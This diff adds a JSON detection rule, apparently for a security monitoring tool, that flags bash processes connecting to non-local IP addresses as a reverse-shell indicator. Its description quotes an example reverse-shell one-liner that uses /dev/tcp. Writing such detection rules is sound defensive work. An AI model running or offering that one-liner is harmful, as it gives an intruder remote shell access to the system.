@@ -1,0 +1,27 @@
+{
+  "version": "1",
+  "ruleDefinitions": [
+    {
+      "name": "Linux Reverse Shell Indicator",
+      "description": "Detects a bash contecting to a remote IP address (often found when actors do something like 'bash -i >& /dev/tcp/10.0.0.1/4242 0>&1')",
+      "useCase": "abnormal process execution",
+      "mitre": [],
+      "sequencesExecution": "CREATION_ORDER",
+      "severity": "critical",
+      "sequencesConfig": {
+        "sequences": [
+          {
+            "name": "",
+            "query": "process_path = RGX(\"\\\\/bin\\\\/bash$\") AND  NOT ((dest_ip = \"127\\.0\\.0\\.1\" OR dest_ip = \"0\\.0\\.0\\.0\"))",
+            "condition": {
+              "triggerOnAnyMatch": true
+            },
+            "id": "7b06ff8c-a142-41a1-ade9-0ab15d4e051c"
+          }
+        ],
+        "commonProperties": null,
+        "outcomes": null
+      }
+    }
+  ]
+}
